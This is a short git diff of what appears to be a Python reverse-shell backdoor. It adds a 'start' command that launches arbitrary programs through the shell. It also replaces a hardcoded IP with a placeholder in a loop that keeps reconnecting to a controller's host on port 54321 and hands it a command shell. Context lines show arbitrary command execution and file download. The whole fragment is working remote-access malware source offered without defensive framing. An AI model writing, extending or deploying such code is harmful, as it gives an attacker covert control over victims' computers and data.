@@ -65,6 +65,13 @@ def shell():
 			except:
 				relaible_send("[-]Failed to download the file")
 
+		elif command[:5]=='start':
+			try:
+				subprocess.Popen(command[6:], shell=True)
+				relaible_send("[+]Successfully started the program")
+			except:
+				relaible_send("[-]Failure in starting the program")
+				
 		else:
 			try:
 				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -80,7 +87,7 @@ def connection():
 	while True:
 		time.sleep(30)
 		try:
-			sock.connect(("192.168.1.9",54321))
+			sock.connect(("<ip addr.>",54321))
 			shell()
 		except:
 			connection()
